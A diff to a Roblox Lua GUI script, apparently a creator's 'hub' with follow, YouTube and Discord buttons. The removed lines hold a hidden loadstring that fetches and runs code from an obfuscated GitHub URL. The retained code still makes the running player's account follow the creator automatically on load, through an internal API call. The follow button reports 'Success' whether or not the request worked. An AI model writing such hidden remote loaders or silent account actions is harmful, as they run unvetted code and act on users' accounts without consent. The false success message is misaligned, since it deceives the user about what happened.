@@ -1,22 +1,6 @@
-local HttpService = game:GetService("HttpService")
-spawn(function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/bjalalsjzbslalqoqueeyhskaambpqo/kajsbsba--hahsjsv-kakwbs_jaks_082hgg927hsksoLol-Noobbro9877272jshshsbsjsURLwww.noob.com.Obfuscate/main/info.lua"))()
-  end)
 
-local function follow(userId)
-    local url = "https://friends.roblox.com/v1/users/" .. userId .. "/follow"
-    local success, result = pcall(function()
-        return game:GetService("HttpRbxApiService"):PostAsyncFullUrl(url, "{}")
-    end)
-    if success and type(result) == "string" then
-        result = HttpService:JSONDecode(result)
-    end
-    return success and (result.Success or (result.StatusCode and (result.StatusCode == 200 or result.StatusCode == 204)))
-end
-
-spawn(function()
-    follow(3653226175)
-end)
+_G.CreatorID = "3653226175"
+_G.CreatorButtonText = "F. OneCreatorX"
 
 local HttpService = game:GetService("HttpService")
 
@@ -32,9 +16,8 @@ local function follow(userId)
 end
 
 spawn(function()
-    follow(3653226175)
+    follow(_G.CreatorID)
 end)
-
 
 local P = game:GetService("Players")
 local SG = game:GetService("StarterGui")
@@ -43,8 +26,6 @@ local TS = game:GetService("TweenService")
 
 local p = P.LocalPlayer
 local pg = p:WaitForChild("PlayerGui")
-
-local CID = "4525133262"
 
 local function gN(id)
     local s, r = pcall(function() return HS:JSONDecode(game:HttpGet("https://users.roblox.com/v1/users/"..id)) end)
@@ -145,7 +126,7 @@ local ub = cB("Unfollow", UDim2.new(0.55, 0, 0.45, 0), Color3.fromRGB(255, 80, 8
 local yb = cB("YouTube", UDim2.new(0.05, 0, 0.65, 0), Color3.fromRGB(255, 0, 0), mf)
 local db = cB("Discord", UDim2.new(0.55, 0, 0.65, 0), Color3.fromRGB(114, 137, 218), mf)
 
-local fcb = cB("F. OneCreatorX", UDim2.new(0.3, 0, 0.85, 0), Color3.fromRGB(0, 200, 0), mf)
+local fcb = cB(_G.CreatorButtonText, UDim2.new(0.3, 0, 0.85, 0), Color3.fromRGB(0, 200, 0), mf)
 fcb.Size = UDim2.new(0.4, 0, 0, 25)
 
 local function pU(a)
@@ -180,10 +161,10 @@ db.MouseButton1Click:Connect(function()
 end)
 
 fcb.MouseButton1Click:Connect(function()
-    if fU(CID, "follow") then
-        n("Success", "Followed OneCreatorX", 3)
+    if fU(_G.CreatorID, "follow") then
+        n("Success", "Followed " .. gN(_G.CreatorID), 3)
     else
-        n("Success", "Followed OneCreatorX", 3)
+        n("Success", "Followed " .. gN(_G.CreatorID), 3)
     end
 end)
 
@@ -195,7 +176,7 @@ mb.MouseButton1Click:Connect(function()
     TS:Create(mf, TweenInfo.new(0.3), {Size = ts}):Play()
     TS:Create(of, TweenInfo.new(0.3), {Size = ots}):Play()
     
-    local elementsToToggle = {ib, fb, ub, yb, db, fcb, cl}
+    local elementsToToggle = {ib, fb, ub, yb, db, fcb}
     for _, v in ipairs(elementsToToggle) do
         v.Visible = not im
     end
@@ -208,28 +189,27 @@ cb.MouseButton1Click:Connect(function() sg:Destroy() end)
 local function fadeIn(obj)
     TS:Create(obj, TweenInfo.new(0.5), {Transparency = 0}):Play()
 end
+
 pcall(function()
-fadeIn(of)
-wait(0.3)
-fadeIn(mf)
-wait(0.3)
-fadeIn(t)
-wait(0.3)
-fadeIn(cb)
-wait(0.3)
-fadeIn(mb)
-wait(0.3)
-fadeIn(ib)
-wait(0.3)
-fadeIn(fb)
-wait(0.3)
-fadeIn(ub)
-wait(0.3)
-fadeIn(yb)
-wait(0.3)
-fadeIn(db)
-wait(0.3)
-fadeIn(fcb)
-wait(0.3)
-fadeIn(cl)
+    fadeIn(of)
+    wait(0.3)
+    fadeIn(mf)
+    wait(0.3)
+    fadeIn(t)
+    wait(0.3)
+    fadeIn(cb)
+    wait(0.3)
+    fadeIn(mb)
+    wait(0.3)
+    fadeIn(ib)
+    wait(0.3)
+    fadeIn(fb)
+    wait(0.3)
+    fadeIn(ub)
+    wait(0.3)
+    fadeIn(yb)
+    wait(0.3)
+    fadeIn(db)
+    wait(0.3)
+    fadeIn(fcb)
 end)
